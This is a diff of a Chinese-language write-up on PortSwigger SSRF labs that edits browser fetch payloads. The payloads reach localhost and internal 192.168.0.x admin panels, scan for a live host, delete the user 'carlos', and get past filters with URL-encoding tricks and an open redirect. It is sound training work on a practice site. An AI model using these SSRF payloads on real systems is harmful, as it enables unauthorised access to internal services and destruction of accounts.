@@ -15,35 +15,27 @@ last_update:
 先
 
 ```js
-fetch(
-  "https://0a7d00ac03b61bf181870c00004b0025.web-security-academy.net/product/stock",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: "stockApi=http://localhost/admin",
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: "stockApi=http://localhost/admin",
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 之後
 
 ```js
-fetch(
-  "https://0a7d00ac03b61bf181870c00004b0025.web-security-academy.net/product/stock",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: `stockApi=${encodeURIComponent("http://localhost/admin/delete?username=carlos")}`,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: `stockApi=${encodeURIComponent("http://localhost/admin/delete?username=carlos")}`,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 是說我從來沒看過有人會把 API 設計成這樣 `stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=2&storeId=1`，然後 Lab 通關條件是要把 admin 的帳號刪掉，也太狠了吧（？而且只要一個 GET API 就能直接刪帳號，真的是有夠牛掰的設計（x
@@ -64,18 +56,14 @@ for (let i = 1; i <= 255; i++) {
   setTimeout(
     () => {
       if (shouldBreak) return;
-      fetch(
-        "https://0ab200a80355f0ce80a4712e008c00b9.web-security-academy.net/product/stock",
-        {
-          headers: {
-            "content-type": "application/x-www-form-urlencoded",
-          },
-          body: `stockApi=${encodeURIComponent(`http://192.168.0.${i}:8080/admin`)}`,
-          method: "POST",
-          mode: "cors",
-          credentials: "include",
+      fetch(`${location.origin}/product/stock`, {
+        headers: {
+          "content-type": "application/x-www-form-urlencoded",
         },
-      ).then((res) => {
+        body: `stockApi=${encodeURIComponent(`http://192.168.0.${i}:8080/admin`)}`,
+        method: "POST",
+        credentials: "include",
+      }).then((res) => {
         if (res.status === 200) {
           shouldBreak = true;
           console.log(i);
@@ -90,18 +78,14 @@ for (let i = 1; i <= 255; i++) {
 在 138 的時候停下
 
 ```js
-fetch(
-  "https://0ab200a80355f0ce80a4712e008c00b9.web-security-academy.net/product/stock",
-  {
-    headers: {
-      "content-type": "application/x-www-form-urlencoded",
-    },
-    body: `stockApi=${encodeURIComponent(`http://192.168.0.138:8080/admin/delete?username=carlos`)}`,
-    method: "POST",
-    mode: "cors",
-    credentials: "include",
+fetch(`${location.origin}/product/stock`, {
+  headers: {
+    "content-type": "application/x-www-form-urlencoded",
   },
-);
+  body: `stockApi=${encodeURIComponent(`http://192.168.0.138:8080/admin/delete?username=carlos`)}`,
+  method: "POST",
+  credentials: "include",
+});
 ```
 
 又要開始刪人家的帳號了XDD
@@ -122,7 +106,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `stockApi=${encodeURIComponent(`http://localhost/admin`)}`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -159,7 +142,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `stockApi=${encodeURIComponent(`http://127.1/%61dmin/delete?username=carlos`)}`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -245,7 +227,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `stockApi=${encodeURIComponent(`http://localhost%23@stock.weliketoshop.net/admin/delete?username=carlos`)}`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -261,7 +242,7 @@ fetch(`${location.origin}/product/stock`, {
 | Document  | https://portswigger.net/web-security/ssrf#bypassing-ssrf-filters-via-open-redirection |
 | Lab       | https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection |
 
-觀察網頁右下角的 `Next Product`，連結 URL 是 `https://0aae007103e0e7af823d3d9c00cd00ec.web-security-academy.net/product/nextProduct?currentProductId=1&path=/product?productId=2`
+觀察網頁右下角的 `Next Product`，連結 URL 是 `/product/nextProduct?currentProductId=1&path=/product?productId=2`
 
 嘗試 `path=https://www.google.com`，成功導轉，找到一個 Open Redirect，之後就
 
@@ -272,7 +253,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `stockApi=${encodeURIComponent(`/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin`)}`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
@@ -286,7 +266,6 @@ fetch(`${location.origin}/product/stock`, {
   },
   body: `stockApi=${encodeURIComponent(`/product/nextProduct?currentProductId=1&path=http://192.168.0.12:8080/admin/delete?username=carlos`)}`,
   method: "POST",
-  mode: "cors",
   credentials: "include",
 });
 ```
